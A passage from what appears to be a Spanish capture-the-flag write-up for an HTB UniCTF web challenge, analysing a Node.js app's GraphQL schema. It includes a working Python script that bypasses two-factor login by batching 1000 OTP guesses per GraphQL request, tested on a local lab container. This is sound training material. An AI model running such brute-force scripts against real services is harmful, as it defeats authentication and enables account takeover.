<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> jwt.</span><span class="mtk8">sign</span><span class="mtk1">(</span><span class="mtk9 mtki">data</span><span class="mtk1">, </span><span class="mtk1">SECRET</span><span class="mtk1">, {</span>
<span class="mtk1">            </span><span class="mtk1">algorithm</span><span class="mtk1">: </span><span class="mtk4">'HS256'</span>
<span class="mtk1">        });</span>
<span class="mtk1">    },</span>
<span class="mtk1">    </span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk8">verify</span><span class="mtk1">(</span><span class="mtk9 mtki">token</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> jwt.</span><span class="mtk8">verify</span><span class="mtk1">(</span><span class="mtk9 mtki">token</span><span class="mtk1">, </span><span class="mtk1">SECRET</span><span class="mtk1">, {</span>
<span class="mtk1">            </span><span class="mtk1">algorithm</span><span class="mtk1">: </span><span class="mtk4">'HS256'</span>
<span class="mtk1">        });</span>
<span class="mtk1">    }</span>
<span class="mtk1">};</span>
</code></pre></div><p>En este punto, solo podemos acceder a:</p><ul><li>GET <code>/</code></li><li>GET <code>/login</code></li><li>GET <code>/2fa</code></li><li>POST <code>/graphql</code></li><li>GET <code>/products/:id</code></li><li>GET <code>/products/preview/:id</code></li></ul><p>La única petición que parece interesante es la de GraphQL.</p><h2 id="atacando-graphql">Atacando GraphQL</h2><p>Solo traté con GraphQL una vez en <a href="../../../../htb/overgraph">OverGraph</a>. De hecho, también había un <em>bypass</em> de OTP, pero tenía que ver con NoSQLi.</p><p>Esta vez, tuve que investigar sobre cómo trabajar con GraphQL (enviar consultas, ejecutar mutaciones, etc.) y buscar vulnerabilidades o malas implementaciones. Traté de consultar la clave OTP utilizada para generar los códigos (que se almacena en la base de datos), pero no fue posible debido al esquema definido en <code>GraphQLHelper.js</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">const</span><span class="mtk1"> JWTHelper </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'./JWTHelper'</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> OTPHelper </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'./OTPHelper'</span><span class="mtk1">);</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> {</span>
<span class="mtk1">    GraphQLObjectType,</span>
<span class="mtk1">    GraphQLSchema,</span>
<span class="mtk1">    GraphQLNonNull,</span>
<span class="mtk1">    GraphQLString,</span>
<span class="mtk1">    GraphQLError</span>
<span class="mtk1">} </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">require</span><span class="mtk1">(</span><span class="mtk4">'graphql'</span><span class="mtk1">);</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">ResponseType</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">GraphQLObjectType</span><span class="mtk1">({</span>
<span class="mtk1">    </span><span class="mtk1">name</span><span class="mtk1">: </span><span class="mtk4">'Response'</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk1">fields</span><span class="mtk1">: {</span>
<span class="mtk1">        </span><span class="mtk1">message</span><span class="mtk1">:         { </span><span class="mtk1">type</span><span class="mtk1">: GraphQLString },</span>
<span class="mtk1">        </span><span class="mtk1">token</span><span class="mtk1">:           { </span><span class="mtk1">type</span><span class="mtk1">: GraphQLString }</span>
<span class="mtk1">    }</span>
<span class="mtk1">});</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">queryType</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">GraphQLObjectType</span><span class="mtk1">({</span>
<span class="mtk1">    </span><span class="mtk1">name</span><span class="mtk1">: </span><span class="mtk4">'Query'</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk1">fields</span><span class="mtk1">: {</span>
<span class="mtk1">        </span><span class="mtk1">_dummy</span><span class="mtk1">: { </span><span class="mtk1">type</span><span class="mtk1">: GraphQLString }</span>
<span class="mtk1">    }</span>
<span class="mtk1">});</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">mutationType</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">GraphQLObjectType</span><span class="mtk1">({</span>
<span class="mtk1">    </span><span class="mtk1">name</span><span class="mtk1">: </span><span class="mtk4">'Mutation'</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk1">fields</span><span class="mtk1">: {</span>
<span class="mtk1">        </span><span class="mtk1">LoginUser</span><span class="mtk1">: {</span>
<span class="mtk1">            </span><span class="mtk1">type</span><span class="mtk1">: </span><span class="mtk1">ResponseType</span><span class="mtk1">,</span>
<span class="mtk1">            </span><span class="mtk1">args</span><span class="mtk1">: {</span>
<span class="mtk1">                </span><span class="mtk1">username</span><span class="mtk1">: { </span><span class="mtk1">type</span><span class="mtk1">: </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">GraphQLNonNull</span><span class="mtk1">(GraphQLString) },</span>
<span class="mtk1">                </span><span class="mtk1">password</span><span class="mtk1">: { </span><span class="mtk1">type</span><span class="mtk1">: </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">GraphQLNonNull</span><span class="mtk1">(GraphQLString) }</span>
<span class="mtk1">            },</span>
<span class="mtk1">            </span><span class="mtk8">resolve</span><span class="mtk1">: </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">root</span><span class="mtk1">, </span><span class="mtk9 mtki">args</span><span class="mtk1">, {</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">}) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">((</span><span class="mtk8">resolve</span><span class="mtk1">, </span><span class="mtk8">reject</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                    db.</span><span class="mtk8">loginUser</span><span class="mtk1">(</span><span class="mtk9 mtki">args</span><span class="mtk1">.username, </span><span class="mtk9 mtki">args</span><span class="mtk1">.password)</span>
<span class="mtk1">                        .</span><span class="mtk8">then</span><span class="mtk1">(</span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">user</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">user</span><span class="mtk1">.length) {</span>
<span class="mtk1">                                </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">token</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> JWTHelper.</span><span class="mtk8">sign</span><span class="mtk1">({</span>
<span class="mtk1">                                    </span><span class="mtk1">username</span><span class="mtk1">: </span><span class="mtk9 mtki">user</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">].username,</span>
<span class="mtk1">                                    </span><span class="mtk1">verified</span><span class="mtk1">: </span><span class="mtk6">false</span>
<span class="mtk1">                                });</span>
<span class="mtk1">                                </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">cookie</span><span class="mtk1">(</span><span class="mtk4">'session'</span><span class="mtk1">, </span><span class="mtk1">token</span><span class="mtk1">, { </span><span class="mtk1">maxAge</span><span class="mtk1">: </span><span class="mtk6">3600000</span><span class="mtk1"> });</span>
<span class="mtk1">                                </span><span class="mtk8">resolve</span><span class="mtk1">({</span>
<span class="mtk1">                                    </span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">"User logged in successfully!"</span><span class="mtk1">,</span>
<span class="mtk1">                                    </span><span class="mtk1">token</span><span class="mtk1">: </span><span class="mtk1">token</span>
<span class="mtk1">                                });</span>
<span class="mtk1">                            };</span>
<span class="mtk1">                            </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Error</span><span class="mtk1">(</span><span class="mtk4">"Username or password is invalid!"</span><span class="mtk1">));</span>
<span class="mtk1">                        })</span>
<span class="mtk1">                        .</span><span class="mtk8">catch</span><span class="mtk1">(</span><span class="mtk9 mtki">err</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">GraphQLError</span><span class="mtk1">(</span><span class="mtk9 mtki">err</span><span class="mtk1">)));</span>
<span class="mtk1">                });</span>
<span class="mtk1">            }</span>
<span class="mtk1">        },</span>
<span class="mtk1">        </span><span class="mtk1">verify2FA</span><span class="mtk1">: {</span>
<span class="mtk1">            </span><span class="mtk1">type</span><span class="mtk1">: </span><span class="mtk1">ResponseType</span><span class="mtk1">,</span>
<span class="mtk1">            </span><span class="mtk1">args</span><span class="mtk1">: {</span>
<span class="mtk1">                </span><span class="mtk1">otp</span><span class="mtk1">: { </span><span class="mtk1">type</span><span class="mtk1">: </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">GraphQLNonNull</span><span class="mtk1">(GraphQLString) }</span>
<span class="mtk1">            },</span>
<span class="mtk1">            </span><span class="mtk8">resolve</span><span class="mtk1">: </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">root</span><span class="mtk1">, </span><span class="mtk9 mtki">args</span><span class="mtk1">, {</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">}) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk9 mtki">req</span><span class="mtk1">.user) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">GraphQLError</span><span class="mtk1">(</span><span class="mtk4">'Authentication required!'</span><span class="mtk1">));</span>  

<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">(</span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk8">resolve</span><span class="mtk1">, </span><span class="mtk8">reject</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">                    secret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> db.</span><span class="mtk8">getOTPKey</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">.user.username);</span>

<span class="mtk1">                    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">await</span><span class="mtk1"> OTPHelper.</span><span class="mtk8">verifyOTP</span><span class="mtk1">(secret.otpkey, </span><span class="mtk9 mtki">args</span><span class="mtk1">.otp)) {</span>
<span class="mtk1">                        </span><span class="mtk7 mtki">let</span><span class="mtk1"> </span><span class="mtk1">token</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> JWTHelper.</span><span class="mtk8">sign</span><span class="mtk1">({</span>
<span class="mtk1">                            </span><span class="mtk1">username</span><span class="mtk1">: </span><span class="mtk9 mtki">req</span><span class="mtk1">.user.username,</span>
<span class="mtk1">                            </span><span class="mtk1">verified</span><span class="mtk1">: </span><span class="mtk6">true</span>
<span class="mtk1">                        });</span>
<span class="mtk1">                        </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">cookie</span><span class="mtk1">(</span><span class="mtk4">'session'</span><span class="mtk1">, </span><span class="mtk1">token</span><span class="mtk1">, { </span><span class="mtk1">maxAge</span><span class="mtk1">: </span><span class="mtk6">3600000</span><span class="mtk1"> });</span>
<span class="mtk1">                        </span><span class="mtk8">resolve</span><span class="mtk1">({</span>
<span class="mtk1">                            </span><span class="mtk1">message</span><span class="mtk1">: </span><span class="mtk4">"2FA verified successfully!"</span><span class="mtk1">,</span>
<span class="mtk1">                            </span><span class="mtk1">token</span><span class="mtk1">: </span><span class="mtk1">token</span>
<span class="mtk1">                        });</span>
<span class="mtk1">                    }</span>
<span class="mtk1">                    </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">                        </span><span class="mtk8">reject</span><span class="mtk1">(</span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">GraphQLError</span><span class="mtk1">(</span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Error</span><span class="mtk1">(</span><span class="mtk4">'Invalid OTP supplied!'</span><span class="mtk1">)));</span>
<span class="mtk1">                    }</span>
<span class="mtk1">                });</span>
<span class="mtk1">            }</span>
<span class="mtk1">        }</span>
<span class="mtk1">    }</span>
<span class="mtk1">});</span>

<span class="mtk7 mtki">module</span><span class="mtk1">.</span><span class="mtk7 mtki">exports</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8">GraphQLSchema</span><span class="mtk1">({</span>
<span class="mtk1">    </span><span class="mtk1">query</span><span class="mtk1">: </span><span class="mtk1">queryType</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk1">mutation</span><span class="mtk1">: </span><span class="mtk1">mutationType</span>
<span class="mtk1">});</span>
</code></pre></div><p>Solo hay dos tipos definidos (<code>Query</code> y <code>Response</code>). En <code>Query</code> solo tenemos <code>_dummy</code>, que es inútil; y el tipo <code>Response</code> se utiliza para enviar el resultado de las mutaciones.</p><p>Hay dos mutaciones: <code>LoginUser</code> y <code>verify2FA</code>. Ambas implementaciones se ven correctas.</p><p>Al mirar en <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#graphql-batching-attacks">PayloadsAllTheThings</a>, vi en la parte inferior de la página una lista de ataques de GraphQL <em>batching</em>, que es una forma de ejecutar múltiples mutaciones dentro de la misma petición HTTP. De hecho, el repositorio dice:</p><blockquote><p><em>Common scenario</em>:</p><ul><li><em>Password Brute-force Amplification Scenario</em></li><li><em>2FA bypassing</em></li></ul></blockquote><p>Esta es exactamente nuestra situación. Aquí hay otros <em>blogs</em> que explican este ataque: <a href="https://lab.wallarm.com/graphql-batching-attack/">lab.wallarm.com</a>, <a href="https://escape.tech/blog/graphql-batch-attacks-cause-dos/">escape.tech</a>.</p><p>Veamos una prueba de concepto de este ataque de GraphQL <em>batching</em> en Burp Suite (probaré localmente con el contenedor Docker disponible en el reto). Esta es una consulta normal:</p><p><img src="/images/other/HTB%20UniCTF/BatchCraft-Potions-5.png" alt="BatchCraft Potions 5"></p><p>Y en esta se utiliza un ataque de GraphQL <em>batching</em> (dos códigos OTP en la misma petición):</p><p><img src="/images/other/HTB%20UniCTF/BatchCraft-Potions-6.png" alt="BatchCraft Potions 6"></p><p>Esto es genial, estamos recibiendo el resultado para dos códigos OTP dentro de la misma respuesta. Por lo tanto, podemos consultar 1000 códigos OTP diferentes y recibir el resultado de cada uno de ellos. Si ninguno de ellos es correcto, podemos enviar los siguientes 1000 hasta que encontremos el código OTP esperado (que vendrá con el <em>token</em> JWT verificado).</p><p>Nótese que no podemos enviar todas las combinaciones (10000) en una sola petición porque el servidor web dará un error por la gran cantidad de datos enviados.</p><h3 id="desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></h3><p>Usemos Python con <code>requests</code> para realizar el ataque y obtener el token JWT verificado. Esta es la sección relevante:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk1">host</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">argv</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">]</span>
<span class="mtk1">    </span><span class="mtk1">token</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">''</span>

<span class="mtk1">    </span><span class="mtk1">s</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">requests</span><span class="mtk1">.</span><span class="mtk8">session</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">r</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">s</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'</span><span class="mtk4 detected-link">http://</span><span class="mtk6 detected-link">{</span><span class="mtk1 detected-link">host</span><span class="mtk6">}</span><span class="mtk4">/graphql'</span><span class="mtk1">,</span>
<span class="mtk1">            </span><span class="mtk9 mtki">json</span><span class="mtk5">=</span><span class="mtk1">{</span>
<span class="mtk1">                </span><span class="mtk4">'query'</span><span class="mtk1">: </span><span class="mtk4">'mutation($username: String!, $password: String!) </span><span class="mtk4">{ LoginUser(username: $username, password: $passwo</span><span class="mtk4">rd) { message, token } }'</span><span class="mtk1">,</span>  
<span class="mtk1">                </span><span class="mtk4">'variables'</span><span class="mtk1">: {</span>
<span class="mtk1">                    </span><span class="mtk4">'username'</span><span class="mtk1">: </span><span class="mtk4">'vendor53'</span><span class="mtk1">,</span>
<span class="mtk1">                    </span><span class="mtk4">'password'</span><span class="mtk1">: </span><span class="mtk4">'PotionsFTW!'</span>
<span class="mtk1">                }</span>
<span class="mtk1">            }</span>
<span class="mtk1">        )</span>

<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk1">token</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">10</span><span class="mtk1">):</span>
<span class="mtk1">            </span><span class="mtk1">variables</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {}</span>
<span class="mtk1">            </span><span class="mtk1">query</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'mutation('</span>

<span class="mtk1">            </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">test_otp</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">1000</span><span class="mtk1">, (</span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">1000</span><span class="mtk1">):</span>
<span class="mtk1">                </span><span class="mtk1">query</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk7 mtki">f</span><span class="mtk4">'$o</span><span class="mtk6">{</span><span class="mtk1">test_otp</span><span class="mtk7 mtki">:04d</span><span class="mtk6">}</span><span class="mtk4">:String!,'</span>
<span class="mtk1">                </span><span class="mtk1">variables</span><span class="mtk1">[</span><span class="mtk7 mtki">f</span><span class="mtk4">'o</span><span class="mtk6">{</span><span class="mtk1">test_otp</span><span class="mtk7 mtki">:04d</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">f</span><span class="mtk4">'</span><span class="mtk6">{</span><span class="mtk1">test_otp</span><span class="mtk7 mtki">:04d</span><span class="mtk6">}</span><span class="mtk4">'</span>

<span class="mtk1">            </span><span class="mtk1">query</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">query</span><span class="mtk1">[:</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">] </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk4">'){'</span>

<span class="mtk1">            </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">test_otp</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">1000</span><span class="mtk1">, (</span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">1000</span><span class="mtk1">):</span>
<span class="mtk1">                </span><span class="mtk1">query</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk7 mtki">f</span><span class="mtk4">'o</span><span class="mtk6">{</span><span class="mtk1">test_otp</span><span class="mtk7 mtki">:04d</span><span class="mtk6">}</span><span class="mtk4">:verify2FA(otp:$o</span><span class="mtk6">{</span><span class="mtk1">test_otp</span><span class="mtk7 mtki">:04d</span><span class="mtk6">}</span><span class="mtk4">)</span><span class="mtk6">{</span><span class="mtk6">{</span><span class="mtk4">message,token</span><span class="mtk6">}}</span><span class="mtk4">,'</span>

<span class="mtk1">            </span><span class="mtk1">query</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk4">'}'</span>

<span class="mtk1">            </span><span class="mtk1">r</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">s</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'</span><span class="mtk4 detected-link">http://</span><span class="mtk6 detected-link">{</span><span class="mtk1 detected-link">host</span><span class="mtk6">}</span><span class="mtk4">/graphql'</span><span class="mtk1">, </span><span class="mtk9 mtki">json</span><span class="mtk5">=</span><span class="mtk1">{</span><span class="mtk4">"query"</span><span class="mtk1">: </span><span class="mtk1">query</span><span class="mtk1">, </span><span class="mtk4">"variables"</span><span class="mtk1">: </span><span class="mtk1">variables</span><span class="mtk1">})</span>

<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk4">'eyJ'</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">r</span><span class="mtk1">.</span><span class="mtk1">text</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk1">token</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">re</span><span class="mtk1">.</span><span class="mtk8">findall</span><span class="mtk1">(</span><span class="mtk7 mtki">r</span><span class="mtk4">'"token":"(.</span><span class="mtk5">*?</span><span class="mtk4">)"'</span><span class="mtk1">, </span><span class="mtk1">r</span><span class="mtk1">.</span><span class="mtk1">text</span><span class="mtk1">)[</span><span class="mtk6">0</span><span class="mtk1">]</span>
<span class="mtk1">                </span><span class="mtk5">break</span>

<span class="mtk1">            </span><span class="mtk8 mtku">time</span><span class="mtk1">.</span><span class="mtk8">sleep</span><span class="mtk1">(</span><span class="mtk6">2</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk1">token</span><span class="mtk1">)</span>
</code></pre></div><p>Obsérvese que eliminé los espacios en blanco innecesarios y acorté los nombres de variables para ahorrar espacio. En unos segundos, obtendremos un <em>token</em> verificado:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1337
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InZlbmRvcjUzIiwidmVyaWZpZWQiOnRydWUsImlhdCI6MTY3MDM0MTcxNH0.8rAyX5qbFYtOU4Fms6pvm7LBIlkkP3rlzUcvZq1G-nM  

<span class="code-cyan">$</span> <span class="code-dark-green">echo</span> eyJ1c2VybmFtZSI6InZlbmRvcjUzIiwidmVyaWZpZWQiOnRydWUsImlhdCI6MTY3MDM0MTcxNH0 | <span class="code-dark-green">base64</span> -d
{"username":"vendor53","verified":true,"iat":167
</code></pre></div><p>Si actualizamos nuestra <em>cookie</em> de sesión, veremos <code>/dashboard</code>:</p><p><img src="/images/other/HTB%20UniCTF/BatchCraft-Potions-7.png" alt="BatchCraft Potions 7"></p><p>En este punto, podemos acceder a estas rutas porque <code>AuthMiddleware</code> ya no bloqueará nuestras peticiones:</p><ul><li>GET <code>/dashboard</code></li><li>POST <code>/api/products/add</code></li></ul><h3 id="más-análisis-de-código-fuente">Más análisis de código fuente</h3><p>Esta es la función que controla el <em>endpoint</em> <code>/api/products/add</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">router</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk4">'/api/products/add'</span><span class="mtk1">, AuthMiddleware, </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">req</span><span class="mtk1">, </span><span class="mtk9 mtki">res</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">adminReviewing</span><span class="mtk1">) </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">500</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk4">'Rate limited!'</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">schema</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> Joi.</span><span class="mtk8">object</span><span class="mtk1">({</span>
<span class="mtk1">        </span><span class="mtk1">product_name</span><span class="mtk1">: Joi.</span><span class="mtk8">string</span><span class="mtk1">().</span><span class="mtk8">required</span><span class="mtk1">(),</span>
<span class="mtk1">        </span><span class="mtk1">product_desc</span><span class="mtk1">: Joi.</span><span class="mtk8">string</span><span class="mtk1">().</span><span class="mtk8">required</span><span class="mtk1">(),</span>
<span class="mtk1">        </span><span class="mtk1">product_price</span><span class="mtk1">: Joi.</span><span class="mtk8">number</span><span class="mtk1">().</span><span class="mtk8">required</span><span class="mtk1">(),</span>
<span class="mtk1">        </span><span class="mtk1">product_category</span><span class="mtk1">: Joi.</span><span class="mtk8">number</span><span class="mtk1">().</span><span class="mtk8">min</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">).</span><span class="mtk8">max</span><span class="mtk1">(</span><span class="mtk6">100</span><span class="mtk1">).</span><span class="mtk8">required</span><span class="mtk1">(),</span>
<span class="mtk1">        </span><span class="mtk1">product_keywords</span><span class="mtk1">: Joi.</span><span class="mtk8">string</span><span class="mtk1">().</span><span class="mtk8">required</span><span class="mtk1">(),</span>
<span class="mtk1">        </span><span class="mtk1">product_og_title</span><span class="mtk1">: Joi.</span><span class="mtk8">string</span><span class="mtk1">().</span><span class="mtk8">required</span><span class="mtk1">(),</span>
<span class="mtk1">        </span><span class="mtk1">product_og_desc</span><span class="mtk1">: Joi.</span><span class="mtk8">string</span><span class="mtk1">().</span><span class="mtk8">required</span><span class="mtk1">()</span>
<span class="mtk1">    });</span>

<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> { </span><span class="mtk1">error</span><span class="mtk1">, </span><span class="mtk1">value</span><span class="mtk1"> } </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">schema</span><span class="mtk1">.</span><span class="mtk8">validate</span><span class="mtk1">(</span><span class="mtk9 mtki">req</span><span class="mtk1">.</span><span class="mtk1">body</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk1">error</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk9 mtki">res</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk6">500</span><span class="mtk1">).</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk8">response</span><span class="mtk1">(</span><span class="mtk1">error</span><span class="mtk1">.message));</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk1">value</span><span class="mtk1">.product_desc </span><span class="mtk5">=</span><span class="mtk1"> FilterHelper.</span><span class="mtk8">filterHTML</span><span class="mtk1">(</span><span class="mtk1">value</span><span class="mtk1">.product_desc);</span>
